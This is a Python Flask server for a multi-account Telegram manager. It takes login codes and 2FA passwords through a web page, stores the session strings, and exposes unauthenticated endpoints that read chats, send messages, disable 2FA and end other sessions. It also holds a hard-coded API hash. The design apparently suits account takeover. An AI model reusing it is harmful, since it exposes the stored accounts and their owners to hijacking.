from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.tl.types import InputPeerUser, InputPeerChat, InputPeerChannel
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
import sqlite3
from datetime import datetime, timedelta
from contextlib import contextmanager
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Database setup
DB_PATH = 'telegram_bot.db'

@contextmanager
def get_db():
    """Get database connection with context manager"""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def init_db():
    """Initialize all database tables"""
    with get_db() as conn:
        # Accounts table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT UNIQUE,
                name TEXT,
                username TEXT,
                session TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Conversation history table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS conversation_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                chat_id TEXT,
                chat_title TEXT,
                role TEXT,
                message TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        # Auto-add settings table (placeholder for future)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS auto_add_settings (
                account_id INTEGER PRIMARY KEY,
                enabled BOOLEAN DEFAULT 0,
                target_group TEXT,
                daily_limit INTEGER DEFAULT 30,
                delay_seconds INTEGER DEFAULT 45,
                added_today INTEGER DEFAULT 0,
                last_reset TEXT,
                settings TEXT,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        # Reply settings table (placeholder for future auto-reply)
        conn.execute('''
            CREATE TABLE IF NOT EXISTS reply_settings (
                account_id INTEGER PRIMARY KEY,
                enabled BOOLEAN DEFAULT 0,
                settings TEXT,
                FOREIGN KEY (account_id) REFERENCES accounts(id)
            )
        ''')
        
        logger.info("✅ Database initialized")

# Global storage
accounts = []
temp_sessions = {}
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Database functions
def load_accounts_from_db():
    """Load accounts from database"""
    global accounts
    accounts = []
    try:
        with get_db() as conn:
            rows = conn.execute('SELECT * FROM accounts ORDER BY id').fetchall()
            for row in rows:
                accounts.append({
                    'id': row['id'],
                    'phone': row['phone'],
                    'name': row['name'],
                    'username': row['username'],
                    'session': row['session']
                })
        logger.info(f"✅ Loaded {len(accounts)} accounts from database")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        init_db()

def add_account_to_db(phone, name, username, session_string):
    """Add account to database"""
    with get_db() as conn:
        cursor = conn.execute(
            'INSERT INTO accounts (phone, name, username, session) VALUES (?, ?, ?, ?)',
            (phone, name, username, session_string)
        )
        return cursor.lastrowid

def update_account_in_db(account_id, name=None, username=None):
    """Update account info in database"""
    with get_db() as conn:
        if name:
            conn.execute('UPDATE accounts SET name = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                        (name, account_id))
        if username:
            conn.execute('UPDATE accounts SET username = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
                        (username, account_id))

def remove_account_from_db(account_id):
    """Remove account from database"""
    with get_db() as conn:
        conn.execute('DELETE FROM accounts WHERE id = ?', (account_id,))
        conn.execute('DELETE FROM conversation_history WHERE account_id = ?', (account_id,))
        conn.execute('DELETE FROM auto_add_settings WHERE account_id = ?', (account_id,))
        conn.execute('DELETE FROM reply_settings WHERE account_id = ?', (account_id,))

def save_conversation(account_id, chat_id, chat_title, role, message):
    """Save conversation message to database"""
    with get_db() as conn:
        conn.execute('''
            INSERT INTO conversation_history (account_id, chat_id, chat_title, role, message)
            VALUES (?, ?, ?, ?, ?)
        ''', (account_id, chat_id, chat_title, role, message))

def get_conversation_history(account_id, chat_id, limit=50):
    """Get conversation history from database"""
    with get_db() as conn:
        rows = conn.execute('''
            SELECT role, message, timestamp 
            FROM conversation_history 
            WHERE account_id = ? AND chat_id = ?
            ORDER BY timestamp DESC LIMIT ?
        ''', (account_id, chat_id, limit)).fetchall()
        
        return [{'role': row['role'], 'message': row['message'], 'time': row['timestamp']} 
                for row in reversed(rows)]

def clear_conversation_history(account_id, chat_id):
    """Clear conversation history for a chat"""
    with get_db() as conn:
        conn.execute('DELETE FROM conversation_history WHERE account_id = ? AND chat_id = ?',
                    (account_id, chat_id))

# Load accounts on startup
init_db()
load_accounts_from_db()

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/auto-add')
def auto_add():
    return send_file('auto_add.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    """Get all accounts"""
    formatted = []
    for acc in accounts:
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'username': acc.get('username', ''),
            'auto_reply_enabled': False  # Placeholder for future auto-reply
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/account-info', methods=['POST'])
def get_account_info():
    """Get detailed account information"""
    data = request.json
    account_id = data.get('accountId')
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_info():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            me = await client.get_me()
            return {
                'success': True,
                'name': me.first_name or '',
                'last_name': me.last_name or '',
                'username': me.username or '',
                'phone': me.phone or '',
                'id': me.id,
                'is_bot': me.bot or False
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_info())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    """Start account addition process - send verification code"""
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                logger.info(f"Code sent to {phone}")
                
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
                
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in add_account: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    """Verify code and complete account addition"""
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    inviter = data.get('inviter', '')  # For referral tracking
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            # Add account to database
            new_id = add_account_to_db(
                me.phone or session_data['phone'],
                me.first_name or 'User',
                me.username or '',
                client.session.save()
            )
            
            # Add to global accounts list
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'username': me.username or '',
                'session': client.session.save()
            }
            accounts.append(new_account)
            
            return {'success': True, 'account': new_account}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    """Remove an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    
    # Remove from database
    remove_account_from_db(account_id)
    
    # Remove from global list
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    return jsonify({'success': True})

@app.route('/api/update-profile', methods=['POST'])
def update_profile():
    """Update account profile"""
    data = request.json
    account_id = data.get('accountId')
    first_name = data.get('firstName')
    last_name = data.get('lastName', '')
    
    if not first_name:
        return jsonify({'success': False, 'error': 'First name required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def update():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            await client(functions.account.UpdateProfileRequest(
                first_name=first_name,
                last_name=last_name
            ))
            
            # Update local account name
            account['name'] = first_name
            update_account_in_db(account_id, name=first_name)
            
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(update())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/update-username', methods=['POST'])
def update_username():
    """Update account username"""
    data = request.json
    account_id = data.get('accountId')
    username = data.get('username', '').strip()
    
    if not username:
        return jsonify({'success': False, 'error': 'Username required'})
    
    # Remove @ if present
    if username.startswith('@'):
        username = username[1:]
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def update():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            await client(functions.account.UpdateUsernameRequest(username))
            
            # Update local account username
            account['username'] = username
            update_account_in_db(account_id, username=username)
            
            return {'success': True}
        except errors.UsernameNotOccupiedError:
            return {'success': False, 'error': 'Username not available'}
        except errors.UsernameInvalidError:
            return {'success': False, 'error': 'Invalid username format'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(update())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/update-2fa', methods=['POST'])
def update_2fa():
    """Update 2FA settings"""
    data = request.json
    account_id = data.get('accountId')
    current_password = data.get('currentPassword', '')
    new_password = data.get('newPassword', '')
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def update_2fa_async():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if new_password:
                # Enable or change password
                await client(functions.account.UpdatePasswordSettingsRequest(
                    password=current_password,
                    new_settings=types.account.PasswordInputSettings(
                        new_password=new_password
                    )
                ))
                return {'success': True, 'message': '2FA enabled/updated'}
            else:
                # Disable password
                await client(functions.account.UpdatePasswordSettingsRequest(
                    password=current_password,
                    new_settings=types.account.PasswordInputSettings(
                        new_password=bytes()
                    )
                ))
                return {'success': True, 'message': '2FA disabled'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid current password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(update_2fa_async())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/search', methods=['POST'])
def search_entities():
    """Search for groups, channels, and users"""
    data = request.json
    account_id = data.get('accountId')
    query = data.get('query')
    
    if not query:
        return jsonify({'success': False, 'error': 'Query required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def search():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            results = []
            
            # Search for contacts
            try:
                contacts = await client(functions.contacts.SearchRequest(
                    q=query,
                    limit=10
                ))
                for user in contacts.users:
                    if hasattr(user, 'first_name'):
                        results.append({
                            'id': str(user.id),
                            'title': user.first_name + (' ' + (user.last_name or '') if user.last_name else ''),
                            'type': 'user',
                            'username': user.username or '',
                            'verified': getattr(user, 'verified', False)
                        })
            except Exception as e:
                logger.error(f"Contact search error: {e}")
            
            # Search for public groups/channels
            try:
                # Use messages search to find groups
                found = await client(functions.contacts.SearchRequest(
                    q=query,
                    limit=20
                ))
                
                for chat in found.chats:
                    if hasattr(chat, 'title'):
                        chat_type = 'group'
                        if hasattr(chat, 'megagroup') and chat.megagroup:
                            chat_type = 'supergroup'
                        elif hasattr(chat, 'broadcast') and chat.broadcast:
                            chat_type = 'channel'
                        
                        results.append({
                            'id': str(chat.id),
                            'title': chat.title,
                            'type': chat_type,
                            'username': getattr(chat, 'username', ''),
                            'members': getattr(chat, 'participants_count', None),
                            'verified': getattr(chat, 'verified', False)
                        })
            except Exception as e:
                logger.error(f"Group search error: {e}")
            
            # Remove duplicates by id
            seen = set()
            unique_results = []
            for r in results:
                if r['id'] not in seen:
                    seen.add(r['id'])
                    unique_results.append(r)
            
            return {'success': True, 'results': unique_results}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(search())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/join-entity', methods=['POST'])
def join_entity():
    """Join a group or channel"""
    data = request.json
    account_id = data.get('accountId')
    entity_id = data.get('entityId')
    
    if not entity_id:
        return jsonify({'success': False, 'error': 'Entity ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def join():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            # Try to get entity
            try:
                entity = await client.get_entity(entity_id)
            except:
                # Try as username
                if not entity_id.startswith('@'):
                    entity = await client.get_entity('@' + entity_id)
                else:
                    raise
            
            # Join channel/group
            if hasattr(entity, 'broadcast') and entity.broadcast:
                # It's a channel
                await client(functions.channels.JoinChannelRequest(entity))
            else:
                # It's a group
                await client(functions.messages.ImportChatInviteRequest(entity.username))
            
            return {'success': True, 'title': getattr(entity, 'title', 'Entity')}
        except errors.InviteHashInvalidError:
            return {'success': False, 'error': 'Invalid invite link'}
        except errors.InviteHashExpiredError:
            return {'success': False, 'error': 'Invite link expired'}
        except errors.UsersTooMuchError:
            return {'success': False, 'error': 'Group is full'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(join())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get chats and messages"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            dialogs = await client.get_dialogs(limit=100)
            
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {'success': True, 'chats': chats}
            
        except AuthKeyUnregisteredError:
            remove_account_from_db(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    """Send a message"""
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            
            # Save to conversation history
            chat_title = getattr(entity, 'title', getattr(entity, 'first_name', 'Unknown'))
            save_conversation(account_id, chat_id, chat_title, 'user', message)
            
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history_api():
    """Get conversation history for a chat"""
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    try:
        history = get_conversation_history(int(account_id), chat_id)
        return jsonify({'success': True, 'history': history})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history_api():
    """Clear conversation history"""
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    try:
        clear_conversation_history(int(account_id), chat_id)
        return jsonify({'success': True, 'message': 'History cleared'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    """Get active sessions for an account"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_sessions_async():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            sessions = []
            current_hash = None
            
            for auth in result.authorizations:
                session_info = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                
                if auth.current:
                    current_hash = auth.hash
                
                sessions.append(session_info)
            
            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'fresh_reset_forbidden'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_sessions_async())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    """Terminate a specific session"""
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    """Terminate all other sessions"""
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            current_hash = None
            for auth in result.authorizations:
                if auth.current:
                    current_hash = auth.hash
                    break
            
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        continue
            
            return {'success': True, 'message': f'Terminated {count} sessions'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings():
    """Placeholder for auto-add settings"""
    if request.method == 'GET':
        account_id = request.args.get('accountId')
        return jsonify({'success': True, 'settings': {'enabled': False}})
    else:
        return jsonify({'success': True})

@app.route('/api/reply-settings', methods=['GET', 'POST'])
def reply_settings():
    """Placeholder for reply settings"""
    if request.method == 'GET':
        account_id = request.args.get('accountId')
        return jsonify({'success': True, 'settings': {'enabled': False}})
    else:
        return jsonify({'success': True})

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'active_clients': len(active_clients),
        'time': datetime.now().isoformat()
    })

@app.route('/ping')
def ping():
    return "pong"

# ==================== KEEP ALIVE SYSTEM ====================

def keep_alive():
    """Keep the server alive and maintain connections"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
    
    while True:
        try:
            # Ping own app
            requests.get(f"{app_url}/ping", timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            
            logger.info(f"🔋 Keep-alive ping sent at {datetime.now().strftime('%H:%M:%S')}")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)  # 4 minutes

# ==================== STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TELEGRAM ACCOUNT MANAGER')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ API_ID: {API_ID}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print('\n📱 Account List:')
    for acc in accounts:
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - @{acc.get("username", "no username")}')
    print('='*70)
    print('🚀 FEATURES:')
    print('   • Multi-account management')
    print('   • Profile editing (name, username)')
    print('   • Two-factor authentication (2FA)')
    print('   • Search groups and channels')
    print('   • Join public groups/channels')
    print('   • View active sessions')
    print('   • Terminate remote sessions')
    print('   • Conversation history')
    print('   • Auto-add members (coming soon)')
    print('   • Auto-reply (coming soon)')
    print('='*70 + '\n')
    
    # Start keep-alive thread
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start Flask
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
